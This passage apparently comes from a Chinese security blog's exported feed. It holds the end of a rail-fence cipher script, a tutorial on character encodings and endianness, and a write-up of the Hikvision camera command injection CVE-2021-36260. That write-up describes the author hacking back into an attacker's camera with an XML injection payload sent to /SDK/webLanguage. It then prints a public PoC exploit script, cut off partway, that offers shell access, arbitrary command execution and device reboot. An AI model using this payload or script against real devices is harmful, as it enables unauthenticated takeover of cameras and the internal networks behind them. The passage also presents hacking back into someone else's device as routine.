class="built_in">print</span>((<span class="built_in">vars</span>()[s]))</span><br><span class="line">        encrypt_message = encrypt_message + <span class="string">&quot;&quot;</span>.join(<span class="built_in">vars</span>()[s])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;栅栏数为<span class="subst">&#123;fence_number&#125;</span>的加密结果为: <span class="subst">&#123;encrypt_message&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> function == <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line">    encrypt_message = <span class="built_in">input</span>(<span class="string">&quot;Please input your encrypt_message:&quot;</span>)</span><br><span class="line">    encrypt_message_length = <span class="built_in">len</span>(encrypt_message)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;批量解密结果如下: &quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> fence_number <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, encrypt_message_length, <span class="number">1</span>):  <span class="comment"># 可能的栅栏数，就不考虑长度为1和密文长度的栅栏数了</span></span><br><span class="line"></span><br><span class="line">        decrypt_message_list = []</span><br><span class="line">        encrypt_message_list = <span class="built_in">list</span>(encrypt_message)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 基本列表大小，即字符串大小除以栅栏数目，向下取整</span></span><br><span class="line">        basic_list_size = <span class="built_in">int</span>(encrypt_message_length / fence_number)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 字符串大小除以栅栏数目取余，后面根据余数确定每个列表最终大小</span></span><br><span class="line">        remainder = encrypt_message_length % fence_number</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 创建全局列表和全局列表的长度，并按照每个列表的长度依次将密文放到列表中</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(fence_number):</span><br><span class="line">            s = <span class="string">&#x27;decrypt_message_list&#x27;</span> + <span class="built_in">str</span>(i)</span><br><span class="line"></span><br><span class="line">            l = <span class="string">&#x27;decrypt_message_list_length&#x27;</span> + <span class="built_in">str</span>(i)</span><br><span class="line">            <span class="keyword">if</span> remainder == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">vars</span>()[l] = basic_list_size</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">vars</span>()[l] = basic_list_size + <span class="number">1</span></span><br><span class="line">                remainder -= <span class="number">1</span></span><br><span class="line">            <span class="built_in">vars</span>()[s] = encrypt_message_list[<span class="number">0</span>:<span class="built_in">vars</span>()[l]]</span><br><span class="line">            <span class="keyword">del</span>(encrypt_message_list[<span class="number">0</span>:<span class="built_in">vars</span>()[l]])</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 按照从上到下，从左到右的顺序将列表中的元素拼接成字符串</span></span><br><span class="line">        <span class="keyword">for</span> column <span class="keyword">in</span> <span class="built_in">range</span>(basic_list_size + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(fence_number):</span><br><span class="line">                s = <span class="string">&#x27;decrypt_message_list&#x27;</span> + <span class="built_in">str</span>(row)</span><br><span class="line">                l = <span class="string">&#x27;decrypt_message_list_length&#x27;</span> + <span class="built_in">str</span>(row)</span><br><span class="line">                <span class="keyword">if</span> column &lt; <span class="built_in">vars</span>()[l]:</span><br><span class="line">                    decrypt_message_list.append(<span class="built_in">vars</span>()[s][column])</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 打印解密字符串</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;栅栏数为<span class="subst">&#123;fence_number&#125;</span>的解密结果为<span class="subst">&#123;<span class="string">&#x27;&#x27;</span>.join(decrypt_message_list)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Input Error!&quot;</span>)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>古典密码</tag>
      </tags>
  </entry>
  <entry>
    <title>浅析字符编码--Unicode与UTF</title>
    <url>/post/b9fef7af.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、原始的ASCII编码"><a href="#一、原始的ASCII编码" class="headerlink" title="一、原始的ASCII编码"></a>一、原始的ASCII编码</h1><p>以下是原始的ASCII编码对应关系图表</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648394719841-972fcd48-2127-4fc7-9728-9a6b50f51f78.jpeg" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648394812321-67c125ef-92d4-475f-a2b4-eadd2e7a461f.jpeg" alt="img"></p>
<p>可以来一个小实验：打开记事本，编辑<code>AB</code>，另存为格式为<code>ANSI</code>的<code>ASCII.txt</code>文件</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648392816488-2bb12b1e-9d8a-48c8-8422-9531eaf8763b.png" alt="img"></p>
<p>使用UE查看十六进制，就会发现的确是<code>AB</code>对应的十六进制数<code>41 42</code>，其中左侧的<code>00000000h</code>是这两个字符的相对偏移</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648392954732-879b255e-0eef-4a02-9dc8-8ce8a76e250a.png" alt="img"></p>
<h1 id="二、ASCII的拓展：GB2312或GB2312-80"><a href="#二、ASCII的拓展：GB2312或GB2312-80" class="headerlink" title="二、ASCII的拓展：GB2312或GB2312-80"></a>二、ASCII的拓展：GB2312或GB2312-80</h1><p>1个字节，最多也就能表示[0，255]总共256个字符，而像汉字，日文，韩文等等，这些在ASCII码表中都没有表示方法所以就必须要创建新的编码</p>
<p>于是GB2312和GB2312-80诞生了，思路就是：<strong>既然ASCII码的扩展表字符不常用，那就针对扩展的ASCII码，把两个扩展的ASCII码字节拼在一起，变成一个新的汉字</strong>。比如<code>C4 E3</code>就是<code>你</code>，<code>BA C3</code>就是<code>好</code></p>
<p>但是这种编码方式有个很严重的问题，每个国家都有每个国家的编码，比如发送一篇编码方式为<code>GB2312</code>，内容为<code>你好</code>，的邮件给新加坡，而新加坡用的是<code>big5</code>编码，也是用两个拓展ASCII的字节拼成一个新的字，但它用<code>big5</code>拼出来肯定不是<code>你好</code>二字，是<strong>乱码</strong>！</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648395089992-68ff8416-b729-4762-9188-ceb448d18c2a.png" alt="img"></p>
<h1 id="三、Unicode编码"><a href="#三、Unicode编码" class="headerlink" title="三、Unicode编码"></a>三、Unicode编码</h1><h2 id="1、什么是Unicode？"><a href="#1、什么是Unicode？" class="headerlink" title="1、什么是Unicode？"></a>1、什么是Unicode？</h2><p>这是一个编码方案，说白了就是一张包含全世界所有文字的一张编码表，只要是这个世界上存在的文字符号，统统给你一个唯一的编码。</p>
<p>Unicode编码范围是：0x000000——0x10FFFF，可以容纳100多万个符号！</p>
<h2 id="2、Unicode的问题"><a href="#2、Unicode的问题" class="headerlink" title="2、Unicode的问题"></a>2、Unicode的问题</h2><p>Unicode只是一个符号集，它只规定了符号的二进制代码，却没有规定这个二进制代码应该如何存储</p>
<p>假设<code>中</code>是：<code>1234</code>，那么就是<code>12 34</code>这样存储，占两个字节；<code>国</code>是<code>12345</code>，那到底该怎么存储，<code>01 23 45</code>还是<code>12 34 50</code>又或者是其他方式呢？不得而知</p>
<h2 id="3、如何存储Unicode：UTF-16-UTF-8"><a href="#3、如何存储Unicode：UTF-16-UTF-8" class="headerlink" title="3、如何存储Unicode：UTF-16/UTF-8"></a>3、如何存储Unicode：UTF-16/UTF-8</h2><p>UTF-16/UTF-8是Unicode的实现方式</p>
<h3 id="（1）UTF-16（Unicode的默认存储方式）"><a href="#（1）UTF-16（Unicode的默认存储方式）" class="headerlink" title="（1）UTF-16（Unicode的默认存储方式）"></a>（1）UTF-16（Unicode的默认存储方式）</h3><p>UTF-16编码以<strong>16位无符号整数</strong>为<strong>单位</strong>，注意是16位为一个单位，<strong>不表示一个字符就只有16位</strong>。这个要看字符的Unicode编码处于什么范围而定，有可能是2个字节，也有可能是4个字节。</p>
<p>没有满两个字节的就补全到两个字节，满两个字节的就补全到四个字节，以此类推。</p>
<p>现在机器上的Unicode编码一般指的就是UTF-16。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648399499121-6c4bbe67-bb90-46ad-8350-c3c238e10fb1.png" alt="img"></p>
<p>做个小实验，文本文件<code>Unicode.txt</code>的内容为<code>A中</code>且用Unicode编码，用UE打开该文件，查看十六进制。计算机中默认是小端存储，首先前两2个字节<code>0xFEFF</code>先别管（后续会说），<code>0x0041</code>是<code>A</code>，<code>0x4E2D</code>是<code>中</code>，没问题</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648399651124-e2f7ee80-4340-45f2-8c49-afa8f2d3324e.png" alt="img"></p>
<p>但这样就会有个问题，<code>A</code>用<code>0x41</code>一个字节就可以存储，用两个字节存储<code>0x0041</code>造成了资源浪费，这在本地存储还没什么，顶多费点硬盘；主要是在网络传输中，本来4k能传完的东西要传8k，浪费了带宽，于是便诞生了UTF-8来解决这个问题，而UTF-8也正是在网络传输问题上火起来了</p>
<p>UTF-32即是以四个字节为单位，更暴力了</p>
<h3 id="（2）UTF-8"><a href="#（2）UTF-8" class="headerlink" title="（2）UTF-8"></a>（2）UTF-8</h3><p>UTF-8是一种<strong>变长</strong>的存储方案，顾名思义，1个字节能存储的就用1个字节，2个字节能存储的就用2个字节…….，<strong>优点</strong>就是<strong>节省空间</strong>，<strong>缺点</strong>就是<strong>解析困难</strong></p>
<p>UTF-8的编码规则很简单，只有二条：</p>
<p>1）<strong>对于单字节的符号，字节的第一位设为0，后面7位为这个符号的unicode码。因此对于英语字母，UTF-8编码和ASCII码是相同的。</strong></p>
<p>2）<strong>对于n字节的符号（n&gt;1），第一个字节的前n位都设为1，第n+1位设为0，后面字节的前两位一律设为10。剩下的没有提及的二进制位，全部为这个符号的unicode码。</strong></p>
<table>
<thead>
<tr>
<th><strong>分类</strong></th>
<th><strong>Unicode编码（16进制）</strong></th>
<th><strong>UTF-8字节流（二进制）</strong></th>
<th><strong>特点</strong></th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>0000 0000 - 0000 007F</td>
<td>0xxxxxx</td>
<td>是咋样就咋样</td>
</tr>
<tr>
<td>2</td>
<td>0000 0080 - 0000 07FF</td>
<td>110xxxxx 10xxxxxx</td>
<td>一分为二</td>
</tr>
<tr>
<td>3</td>
<td>0000 0800 - 0000 FFFF</td>
<td>1110xxxx 10xxxxxx 10xxxxxx</td>
<td>一分为三</td>
</tr>
<tr>
<td>4</td>
<td>0001 0000 - 0010 FFFF</td>
<td>11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</td>
<td>一分为四</td>
</tr>
</tbody></table>
<p>举个例子，由上面的实验可知以下信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A中--&gt;Unicode编码：0x0041 0x4E2D</span><br></pre></td></tr></table></figure>

<p>现在将<code>A中</code>进行UTF-8编码，结果如下图：前面的三个字节<code>0xBFBBEF</code>先不用管，后面是<code>41 E4 B8 AD</code></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648401365109-b4a4cf23-9be8-4bad-9ac2-5df0d83952e1.png" alt="img"></p>
<p>为什么会这样呢？看下面的分析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">首先是已知信息</span><br><span class="line">A中--&gt;UTF-16编码：0x0041 0x4E2D</span><br><span class="line">A中--&gt;UTF-8编码：  0x41 0xE4B8AD（UTF-8以大端存储）</span><br><span class="line"></span><br><span class="line">我们从已知信息来分析为什么会产生这样的结果</span><br><span class="line">[+] A的UTF-16编码的结果为0x0041，在上表中第一种情况的区间内，因此是咋样就咋样，UTF16的A转换为UTF-8的A保持不变</span><br><span class="line">[+] 中的UTF-16编码的结果为0x4E2D，在上表中第三种情况的区间内，因此按照以下规则一分为三：</span><br><span class="line">	[---] 0x4E2D的二进制是0100 1110 0010 1101，将得到的二进制数据依次填充到1110xxxx 10xxxxxx 10xxxxxx中就是1110(0100) 10(111000) 10(101101)，即E4 B8 AD，即0xE4B8AD</span><br><span class="line">    [---] 同样的，反向分析的话，0xE4B8AD二进制为1110(0100) 10(111000) 10(101101)，以四位即十六进制提取出来即0100 1110 0010 1101，即4E 2D，即0x4E2D</span><br></pre></td></tr></table></figure>

<p>因此可以得出一个一般性的结论：当网络传输文件的时候，数字字母符号比较多，就用UTF-8更节省资源，如果汉字比较多，用UTF-8节省不了多少资源，使用UTF-16即可</p>
<h3 id="（3）BOM（Byte-Order-Mark）"><a href="#（3）BOM（Byte-Order-Mark）" class="headerlink" title="（3）BOM（Byte Order Mark）"></a>（3）BOM（Byte Order Mark）</h3><p>如果接收到了一个文件，我们怎么知道是用UTF-8还是用UTF-16解析呢？这就有了<strong>字节序标记</strong>来解决这个问题</p>
<table>
<thead>
<tr>
<th><strong>编码</strong></th>
<th><strong>数据流</strong></th>
<th><strong>大小端</strong></th>
</tr>
</thead>
<tbody><tr>
<td>UTF-8</td>
<td>EF BB BF</td>
<td>大端存储</td>
</tr>
<tr>
<td>UTF-16 LE（little endian）</td>
<td>FF FE</td>
<td>小端存储</td>
</tr>
<tr>
<td>UTF-16 BE（big endian）</td>
<td>FE FF</td>
<td>大端存储</td>
</tr>
</tbody></table>
<p>为什么UTF-16需要区分大端小端，而UTF-8不用呢？</p>
<p>对UTF-16来说，因为是以两个字节为单位，两个字节正着放，和反着放，会对应两个不同字上面去。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648405617784-274d734c-6051-4e61-80b8-b0f579786ef4.png" alt="img"></p>
<p>对UTF-8来说，由于UTF-8的设计，一个字符对应的各个字节，是能够区分出哪个是数据高位、哪个数据低位的，所以不需要。上表中，第一个字节就属于是数据高位。</p>
<p>不管是内存、还是文件，程序总是从低地址读到高地址，而由于第一个字节的开头可以指示出这个字符还剩余几个字节需要读取，所以UTF-8必须把可以指示剩余字节数的那个字节放到低地址，其余字节依次放到高地址。</p>
<h1 id="四、大小端存储方式"><a href="#四、大小端存储方式" class="headerlink" title="四、大小端存储方式"></a>四、大小端存储方式</h1><p>计算机默认是<strong>小端存储</strong></p>
<p><strong>小端存储</strong>：是指数据的高字节保存在内存的高地址中，而数据的低字节保存在内存的低地址中，这种存储模式将地址的高低和数据位权有效地结合起来，高地址部分权值高，低地址部分权值低，和我们的逻辑方法一致。</p>
<p> <strong>大端存储</strong>：是指数据的高字节保存在内存的低地址中，而数据的低字节保存在内存的高地址中，这样的存储模式有点儿类似于把数据当作字符串顺序处理：地址由小向大增加，而数据从高位往低位放。（大端模式是我们直观上的认为的模式）  </p>
<p>如果将一个32位的整数<code>0x12345678</code>存放到一个整型变量（int）中，这个整型变量采用大端或者小端模式在内存中的存储由下表所示。</p>
<p>为简单起见，本文使用OP0表示一个32位数据的最高字节MSB（Most Significant Byte），使用OP3表示一个32位数据最低字节LSB（Least Significant Byte）。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648398495213-4d398cd6-69cf-4a82-a58f-a1049f0f686e.png" alt="img">    </p>
<p>小端：<strong>较高</strong>的有效字节存放在<strong>较高</strong>的存储器地址，<strong>较低</strong>的有效字节存放在<strong>较低</strong>的存储器地址。<br>大端：<strong>较高</strong>的有效字节存放在<strong>较低</strong>的存储器地址，<strong>较低</strong>的有效字节存放在<strong>较高</strong>的存储器地址。</p>
<p>测试代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0x12345678</span>;</span><br><span class="line">    <span class="keyword">char</span>* pc = (<span class="keyword">char</span>*)&amp;i;</span><br><span class="line">    <span class="keyword">if</span> (*pc == <span class="number">0x12</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Big Endian\n&quot;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (*pc == <span class="number">0x78</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Little Endian\n&quot;</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648405271309-d5666d39-5ac0-47dc-bba8-2078b42aaabc.png" alt="img"></p>
]]></content>
      <categories>
        <category>二进制</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>海康威视远程命令执行漏洞（CVE-2021-36260）</title>
    <url>/post/8d6522ff.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>作为HW2022的防守方，发现一IP频繁对我方资产进行扫描，遂进行溯源</p>
<h1 id="二、漏洞概述"><a href="#二、漏洞概述" class="headerlink" title="二、漏洞概述"></a>二、漏洞概述</h1><p>攻击者利用该漏洞可以用无限制的 root shell 来完全控制设备，即使设备的所有者受限于有限的受保护 shell（psh）。除了入侵 IP 摄像头外，还可以访问和攻击内部网络。</p>
<p>该漏洞的利用并不需要用户交互，攻击者只需要访问 http 或 HTTPS 服务器端口（80/443）即可利用该漏洞，无需用户名、密码、以及其他操作。摄像头本身也不会检测到任何登录信息。</p>
<h1 id="三、溯源过程"><a href="#三、溯源过程" class="headerlink" title="三、溯源过程"></a>三、溯源过程</h1><p>定位攻击IP与搜索威胁情报，发现是恶意IP</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659059058184-062a339d-c494-4429-98ee-876596be46b1.png" alt="img"></p>
<p>Fofa空间搜索引擎发现该IP开放了82端口</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659058945204-78705050-0b6f-4411-9887-cb407fc2eab8.png" alt="img"></p>
<p>访问发现是HIKVISION的登录界面</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659059182921-6978b432-d22b-4313-8cad-2429d347f19a.png" alt="img"></p>
<p>漏洞点位于：/SDK/webLanguage，利用PUT方法上传xml数据：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27;?&gt;</span><span class="tag">&lt;<span class="name">language</span>&gt;</span>$(Command &gt; webLib/x)<span class="tag">&lt;/<span class="name">language</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659059541576-41453ae2-94d1-4227-9265-18ec24aa976e.png" alt="img"></p>
<p>再去请求路径：/x，发现命令已经执行成功</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659059625380-f523a5da-2429-4a3f-90e0-7ab69a480e17.png" alt="img"></p>
<p>使用EXP成功拿下该摄像头的完全控制权，排查后此应为攻击者的跳板机</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659060982463-34489494-0873-4f9f-97fe-bea61e35583a.png" alt="img"></p>
<p>此网段存在许多感染摄像头，也都存在上述漏洞</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1659081117392-52cb562e-5a79-411a-96a6-429f742ce1fb.png" alt="img"></p>
<p>虽然拿下了完全控制权，但是不知道如何查看摄像头Web页面的管理员账号密码，有大佬知道的可以评论区教教我（万分感谢！）</p>
<h1 id="四、POC"><a href="#四、POC" class="headerlink" title="四、POC"></a>四、POC</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: Hikvision Web Server Build 210702 - Command Injection</span></span><br><span class="line"><span class="comment"># Exploit Author: bashis</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://www.hikvision.com/</span></span><br><span class="line"><span class="comment"># Version: 1.0</span></span><br><span class="line"><span class="comment"># CVE: CVE-2021-36260</span></span><br><span class="line"><span class="comment"># Reference: https://watchfulip.github.io/2021/09/18/Hikvision-IP-Camera-Unauthenticated-RCE.html</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># All credit to Watchful_IP</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Note:</span></span><br><span class="line"><span class="string">1)  This code will _not_ verify if remote is Hikvision device or not.</span></span><br><span class="line"><span class="string">2)  Most of my interest in this code has been concentrated on how to</span></span><br><span class="line"><span class="string">    reliably detect vulnerable and/or exploitable devices.</span></span><br><span class="line"><span class="string">    Some devices are easy to detect, verify and exploit the vulnerability,</span></span><br><span class="line"><span class="string">    other devices may be vulnerable but not so easy to verify and exploit.</span></span><br><span class="line"><span class="string">    I think the combined verification code should have very high accuracy.</span></span><br><span class="line"><span class="string">3)  &#x27;safe check&#x27; (--check) will try write and read for verification</span></span><br><span class="line"><span class="string">    &#x27;unsafe check&#x27; (--reboot) will try reboot the device for verification</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Examples]</span></span><br><span class="line"><span class="string">Safe vulnerability/verify check:</span></span><br><span class="line"><span class="string">    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --check</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Safe and unsafe vulnerability/verify check:</span></span><br><span class="line"><span class="string">(will only use &#x27;unsafe check&#x27; if not verified with &#x27;safe check&#x27;)</span></span><br><span class="line"><span class="string">    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --check --reboot</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Unsafe vulnerability/verify check:</span></span><br><span class="line"><span class="string">    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --reboot</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Launch and connect to SSH shell:</span></span><br><span class="line"><span class="string">    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --shell</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Execute command:</span></span><br><span class="line"><span class="string">    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --cmd &quot;ls -l&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Execute blind command:</span></span><br><span class="line"><span class="string">    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --cmd_blind &quot;reboot&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$./CVE-2021-36260.py -h</span></span><br><span class="line"><span class="string">[*] Hikvision CVE-2021-36260</span></span><br><span class="line"><span class="string">[*] PoC by bashis &lt;mcw noemail eu&gt; (2021)</span></span><br><span class="line"><span class="string">usage: CVE-2021-36260.py [-h] --rhost RHOST [--rport RPORT] [--check]</span></span><br><span class="line"><span class="string">                         [--reboot] [--shell] [--cmd CMD]</span></span><br><span class="line"><span class="string">                         [--cmd_blind CMD_BLIND] [--noverify]</span></span><br><span class="line"><span class="string">                         [--proto &#123;http,https&#125;]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">optional arguments:</span></span><br><span class="line"><span class="string">  -h, --help            show this help message and exit</span></span><br><span class="line"><span class="string">  --rhost RHOST         Remote Target Address (IP/FQDN)</span></span><br><span class="line"><span class="string">  --rport RPORT         Remote Target Port</span></span><br><span class="line"><span class="string">  --check               Check if vulnerable</span></span><br><span class="line"><span class="string">  --reboot              Reboot if vulnerable</span></span><br><span class="line"><span class="string">  --shell               Launch SSH shell</span></span><br><span class="line"><span class="string">  --cmd CMD             execute cmd (i.e: &quot;ls -l&quot;)</span></span><br><span class="line"><span class="string">  --cmd_blind CMD_BLIND</span></span><br><span class="line"><span class="string">                        execute blind cmd (i.e: &quot;reboot&quot;)</span></span><br><span class="line"><span class="string">  --noverify            Do not verify if vulnerable</span></span><br><span class="line"><span class="string">  --proto &#123;http,https&#125;  Protocol used</span></span><br><span class="line"><span class="string">$</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> packages</span><br><span class="line"><span class="keyword">from</span> requests.packages <span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3 <span class="keyword">import</span> exceptions</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Http</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, rhost, rport, proto, timeout=<span class="number">60</span></span>):</span></span><br><span class="line">        <span class="built_in">super</span>(Http, self).__init__()</span><br><span class="line"></span><br><span class="line">        self.rhost = rhost</span><br><span class="line">        self.rport = rport</span><br><span class="line">        self.proto = proto</span><br><span class="line">        self.timeout = timeout</span><br><span class="line"></span><br><span class="line">        self.remote = <span class="literal">None</span></span><br><span class="line">        self.uri = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;&quot;&quot; Most devices will use self-signed certificates, suppress any warnings &quot;&quot;&quot;</span></span><br><span class="line">        requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">        self.remote = requests.Session()</span><br><span class="line"></span><br><span class="line">        self._init_uri()</span><br><span class="line"></span><br><span class="line">        self.remote.headers.update(&#123;</span><br><span class="line">            <span class="string">&#x27;Host&#x27;</span>: <span class="string">f&#x27;<span class="subst">&#123;self.rhost&#125;</span>:<span class="subst">&#123;self.rport&#125;</span>&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded; charset=UTF-8&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en-US,en;q=0.9,sv;q=0.8&#x27;</span>,</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        self.remote.proxies.update(&#123;</span></span><br><span class="line"><span class="string">            # &#x27;http&#x27;: &#x27;http://127.0.0.1:8080&#x27;,</span></span><br><span class="line"><span class="string">        &#125;)</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">self, url=<span class="literal">None</span>, query_args=<span class="literal">None</span>, timeout=<span class="number">5</span></span>):</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> query_args:</span><br><span class="line">            <span class="string">&quot;&quot;&quot;Some devices can handle more, others less, 22 bytes seems like a good compromise&quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(query_args) &gt; <span class="number">22</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[!] Error: Command &quot;<span class="subst">&#123;query_args&#125;</span>&quot; to long (<span class="subst">&#123;<span class="built_in">len</span>(query_args)&#125;</span>)&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;&quot;&quot;This weird code will try automatically switch between http/https</span></span><br><span class="line"><span class="string">        and update Host</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> url <span class="keyword">and</span> <span class="keyword">not</span> query_args:</span><br><span class="line">                <span class="keyword">return</span> self.get(url, timeout)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                data = self.put(<span class="string">&#x27;/SDK/webLanguage&#x27;</span>, query_args, timeout)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ConnectionError:</span><br><span class="line">            self.proto = <span class="string">&#x27;https&#x27;</span> <span class="keyword">if</span> self.proto == <span class="string">&#x27;http&#x27;</span> <span class="keyword">else</span> <span class="string">&#x27;https&#x27;</span></span><br><span class="line">            self._init_uri()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> url <span 